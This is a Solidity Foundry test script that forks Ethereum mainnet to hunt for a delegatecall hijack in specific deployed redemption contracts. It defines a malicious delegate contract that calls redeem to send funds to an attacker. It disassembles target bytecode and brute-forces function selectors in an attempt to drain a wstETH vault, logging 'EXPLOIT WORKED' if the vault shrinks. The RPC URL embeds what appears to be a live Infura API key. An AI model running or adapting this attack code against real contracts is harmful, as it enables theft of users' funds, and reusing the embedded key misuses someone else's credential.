// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

// Malicious contract for delegatecall hijack
contract MaliciousDelegate {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;

    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    fallback() external payable {
        // When REDEMPTION_0 delegatecalls to us, msg.sender = original caller
        // But we execute in REDEMPTION_0's context!
        // So we can call RC.redeem as REDEMPTION_0!
        REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 500e18, attacker)
        );
    }
}

contract CalldataDelegatecall is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;
    MaliciousDelegate malicious;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);

        vm.prank(attacker);
        malicious = new MaliciousDelegate(attacker);
    }

    function test_AnalyzeDelegatecallAt2450() public view {
        console.log("=== ANALYZING DELEGATECALL AT 2450 ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Look at bytecode around offset 2450
        console.log("Bytecode from 2400 to 2500:");

        for (uint i = 2400; i < 2500 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x35) console.log(i, "CALLDATALOAD");
            else if (op == 0x36) console.log(i, "CALLDATASIZE");
            else if (op == 0x54) console.log(i, "SLOAD");
            else if (op == 0x55) console.log(i, "SSTORE");
            else if (op == 0xf1) console.log(i, "CALL");
            else if (op == 0xf4) console.log(i, "DELEGATECALL");
            else if (op == 0x5b) console.log(i, "JUMPDEST");
            else if (op == 0x51) console.log(i, "MLOAD");
            else if (op == 0x52) console.log(i, "MSTORE");
            else if (op == 0x73) {
                console.log(i, "PUSH20");
            }
            else if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (size <= 4 && val < 10000) {
                    console.log(i, "PUSH val:", val);
                }
            }
        }
    }

    function test_AnalyzeDelegatecallAt2681() public view {
        console.log("=== ANALYZING DELEGATECALL AT 2681 ===\n");

        bytes memory code = REDEMPTION_0.code;

        console.log("Bytecode from 2630 to 2720:");

        for (uint i = 2630; i < 2720 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x35) console.log(i, "CALLDATALOAD");
            else if (op == 0x54) console.log(i, "SLOAD");
            else if (op == 0xf1) console.log(i, "CALL");
            else if (op == 0xf4) console.log(i, "DELEGATECALL");
            else if (op == 0x5b) console.log(i, "JUMPDEST");
            else if (op == 0x51) console.log(i, "MLOAD");
            else if (op == 0x52) console.log(i, "MSTORE");
            else if (op == 0x73) console.log(i, "PUSH20");
            else if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (size <= 4 && val < 10000) {
                    console.log(i, "PUSH val:", val);
                }
            }
        }
    }

    function test_AnalyzeDelegatecallAt3821() public view {
        console.log("=== ANALYZING DELEGATECALL AT 3821 ===\n");

        bytes memory code = REDEMPTION_0.code;

        console.log("Bytecode from 3770 to 3860:");

        for (uint i = 3770; i < 3860 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x35) console.log(i, "CALLDATALOAD");
            else if (op == 0x54) console.log(i, "SLOAD");
            else if (op == 0xf1) console.log(i, "CALL");
            else if (op == 0xf4) console.log(i, "DELEGATECALL");
            else if (op == 0x5b) console.log(i, "JUMPDEST");
            else if (op == 0x51) console.log(i, "MLOAD");
            else if (op == 0x73) console.log(i, "PUSH20");
            else if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (size <= 4 && val < 10000) {
                    console.log(i, "PUSH val:", val);
                }
            }
        }
    }

    function test_AnalyzeDelegatecallAt6592() public view {
        console.log("=== ANALYZING DELEGATECALL AT 6592 ===\n");

        bytes memory code = REDEMPTION_0.code;

        console.log("Bytecode from 6540 to 6640:");

        for (uint i = 6540; i < 6640 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x35) console.log(i, "CALLDATALOAD");
            else if (op == 0x54) console.log(i, "SLOAD");
            else if (op == 0xf1) console.log(i, "CALL");
            else if (op == 0xf4) console.log(i, "DELEGATECALL");
            else if (op == 0x5b) console.log(i, "JUMPDEST");
            else if (op == 0x51) console.log(i, "MLOAD");
            else if (op == 0x73) console.log(i, "PUSH20");
            else if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (size <= 4 && val < 10000) {
                    console.log(i, "PUSH val:", val);
                }
            }
        }
    }

    function test_TryMaliciousDelegatecall() public {
        console.log("=== TRYING MALICIOUS DELEGATECALL ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);
        console.log("Malicious contract:", address(malicious));

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Try various ways to make REDEMPTION_0 delegatecall to our malicious contract

        // Method 1: Try if there's a function that takes target address
        (bool s1,) = REDEMPTION_0.call(
            abi.encodeWithSignature("execute(address,bytes)", address(malicious), "")
        );
        console.log("execute(malicious, empty):", s1);

        // Method 2: Pack malicious address in calldata
        (bool s2,) = REDEMPTION_0.call(
            abi.encodePacked(bytes4(0xdeadbeef), address(malicious))
        );
        console.log("packed malicious:", s2);

        // Method 3: Try calling unknown selector with malicious address
        bytes4[] memory toTry = new bytes4[](5);
        toTry[0] = bytes4(0x196e6b1d);
        toTry[1] = bytes4(0x04824e70);
        toTry[2] = bytes4(0x1650cf97);
        toTry[3] = bytes4(0x192a8e86);
        toTry[4] = bytes4(0xba087652);

        for (uint i = 0; i < toTry.length; i++) {
            (bool s,) = REDEMPTION_0.call(
                abi.encodeWithSelector(toTry[i], address(malicious), 100e18)
            );
            if (s) {
                console.log("SUCCESS with:");
                console.logBytes4(toTry[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);
        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);

        if (attackerWstETH > 0) {
            console.log("\n*** MALICIOUS DELEGATECALL EXPLOIT WORKED! ***");
        }
    }

    function test_WiderSelectorSearch() public {
        console.log("=== WIDER SELECTOR SEARCH ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try many selectors with malicious address + calldata pattern
        bytes memory rcCall = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);

        console.log("Trying selectors with (address, bytes):");

        // All unknown selectors from REDEMPTION_0
        bytes4[] memory sels = new bytes4[](20);
        sels[0] = bytes4(0xed45b661);
        sels[1] = bytes4(0xeda72134);
        sels[2] = bytes4(0xb2118a8d);
        sels[3] = bytes4(0xcff50c6e);
        sels[4] = bytes4(0x900fd1ed);
        sels[5] = bytes4(0x9307e802);
        sels[6] = bytes4(0xa82b69ff);
        sels[7] = bytes4(0x3a2ef9df);
        sels[8] = bytes4(0x458f5815);
        sels[9] = bytes4(0x51cbf345);
        sels[10] = bytes4(0x3f14c193);
        sels[11] = bytes4(0x196e6b1d);
        sels[12] = bytes4(0x04824e70);
        sels[13] = bytes4(0x1650cf97);
        sels[14] = bytes4(0x192a8e86);
        sels[15] = bytes4(0x4cdad506);
        sels[16] = bytes4(0xba087652);
        sels[17] = bytes4(0x1f240274);
        sels[18] = bytes4(0x035faf82);
        sels[19] = bytes4(0x5f8b5592);

        for (uint i = 0; i < sels.length; i++) {
            uint256 vaultNow = IERC20(wstETH).balanceOf(VAULT);

            // Try with address(malicious) + rc call
            (bool s,) = REDEMPTION_0.call(
                abi.encodeWithSelector(sels[i], address(malicious), rcCall)
            );

            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            if (vaultAfter < vaultNow) {
                console.log("DRAINED with selector:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultFinal = IERC20(wstETH).balanceOf(VAULT);
        if (vaultFinal < vaultBefore) {
            console.log("\n*** EXPLOIT WORKED! ***");
        }
    }
}
